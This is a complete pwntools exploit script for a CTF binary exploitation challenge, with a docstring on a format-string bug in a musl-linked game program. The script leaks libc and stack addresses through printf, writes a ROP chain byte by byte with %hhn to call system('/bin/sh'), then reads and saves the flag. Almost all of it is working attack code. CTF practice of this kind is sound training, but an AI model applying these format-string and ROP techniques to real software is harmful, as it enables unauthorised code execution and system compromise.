#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val, ssl=True)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)



'''
This program allows creating a character to fight the yellow king.
The user can select one of three classes:

1. magician
2. swordsman
3. thief

The character has a 32-byte name and is allocated using calloc.
The program will put at the end of the name a \x00.
The user chooses an index (0–16) where the pointer is stored
in a global array.
The 33rd byte stores the class index.
During the fight with the Yellow King, this value is checked:
if it is not 0, the fight is lost; if it is 0, the user wins
and can leave a message of 48 bytes.

The message will be printed with a printf with no format parameters:
printf(message);
Leading to a fmtstr exploitation.

so here's the step:
Enter a 32 bytes long name, so the 33rd byte will be set to NULL.
The game will recognize the character as D3rdlord3, granting us win.

Then, with the fmstr will write my gadget to win... easy?
No, because the libc in use is musl, so no easy way.

Musl does not allow skipping positional format specifiers:
to use %10$p, there MUST be %9$p, %8$p, ..., %1$p.
This is due to musl building an internal "grid" for argument assignment.
To build the grid it expects to find all the previous complete positions.

Unfortunately, using %1$p%2$p...%input_offset$p consumes too many characters,
and we only have 48 bytes per attempt.

However, %1$p%2$p...%input_offset$p is equivalent to %p%p%p!
So, to locate my input on the stack, I can repeatedly use %p.

Once the correct offset is found, I can use a chain of %p
to reach the desired position, then append the correct fmt.
'''

io = start()
line = b">>"
idx = b'0'

def create_char(idx, name):
    io.sendlineafter(line, b'1')
    io.sendlineafter(b":\n", idx)
    io.sendlineafter(line, b'2')
    io.sendlineafter(line, name)

def leave_message(idx, fmt, out=True):
    io.sendlineafter(line, b'2')
    io.sendlineafter(b":\n", idx)
    io.sendlineafter(b"..\n", fmt)
    io.recvuntil(b'adventurers..\n')
    if out:
        return io.recvuntil(b'---MUD')[:-6]

def read_format(idx, partial_fmt, address):
    # heres the chain builder for read, where my input is a %12$s
    fmt = "".join([f'%p' for i in range(1,11)]) + partial_fmt
    fmt = fmt.ljust(24, 'a').encode() + p64(address)
    msg = leave_message(idx, fmt)
    leak = msg[msg.index(b'aa') - 6 :msg.index(b'aa')]
    return u64(leak.ljust(8, b'\x00'))

def write_format(idx, partial_fmt, address):
    # here the padding is different because the 12th param
    # is consumed by %Nc, so the 13th parameter will be my address 
    fmt = "".join([f'%p' for i in range(1,11)]) + partial_fmt
    fmt = fmt.ljust(32, 'a').encode() + address
    leave_message(idx, fmt, False)


# setting the char name as a valid argument for system('/bin/sh\x00')
create_char(idx, b'/bin/sh\x00'.ljust(32, b'a'))
printf_leak = read_format(idx, '%s', exe.got['printf'])
libc.address = printf_leak - libc.sym['printf']
success(f"libc base   @ {hex(libc.address)}")
success(f"libc printf @ {hex(libc.sym['printf'])}")
success(f"libc strlen @ {hex(libc.sym['strlen'])}")


rop_exe = ROP(exe)
pop_rdi_jump_rax = libc.address + 0x000000000003e779
pop_rax = rop_exe.rax[0]

binsh = read_format(idx, '%s', exe.sym['list'])
stack = read_format(idx, '%s', libc.sym['environ'])
function_ret = stack - 128

success(f"character  @ {hex(binsh)}")
success(f"stack leak @ {hex(stack)}")
success(f"stack ret  @ {hex(function_ret)}")

call_system = flat([
    0, # 8 byte padding
    pop_rax, libc.sym['system'],
    pop_rdi_jump_rax, binsh
    ])


prog = log.progress("Writing ROP chain")
next_stack = function_ret + 8
payload_len = len(call_system)
bytes_written = 74

for i in range(payload_len):
    to_write = (call_system[i] - bytes_written) & 0xff
    prog.status(f"Writing {hex(call_system[i])} to {hex(next_stack + i)} ({i+1} of {payload_len})")
    write_format(idx, f"%{to_write}c%hhn", p64(next_stack + i))

prog.success("ROP chain written")
warning('Activating shell...')

# this triggers a pop rax to allign and start the payload
write_format(idx, f"%{(0x1001 - bytes_written) & 0xffff}c%hn", p64(function_ret))
io.sendline(b"cat flag*")

data = io.recvregex(rb'nite\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
